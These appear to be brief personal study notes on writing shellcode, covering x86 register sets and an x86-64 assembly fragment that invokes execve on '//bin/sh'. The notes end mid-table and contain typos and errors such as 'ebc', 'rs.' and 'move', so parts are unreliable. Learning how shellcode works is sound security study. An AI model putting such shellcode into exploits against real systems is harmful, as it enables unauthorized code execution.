# Shell Code

What is it? -> it is machine code that returns a remote shell when executed (also has been extended to include any byte that inserted into an exploit to accomplish a task)

# 32 bit Architecture 

Only has 8 registers

ebc eax edx esi edi ebp

sysenter

generally, syscall will only change eax

# 64 bit Architecture

rax rdi rs. rdx r10 r8 r9

syscall

generally, syscall will only change rax (r11 and rcx are clobered by syscall, which is why we don't use them)

	ifndef RAX_IS_ZERO
		xor	rax, rax
	endif
		push	rax
		move	rdi, '//bin/sh'
		push	rdi
		mov	rdi, rsp
		push	rax
		mov	rdx, rsp
		push	rdi
		mov	rsi, rsp
		mov	al, LINUX_SYS_execve
		syscall

Now to create shellcode

	rax	rdi		rs.	rdx	r10	r8	r9
	0	'//bin/sh'	 
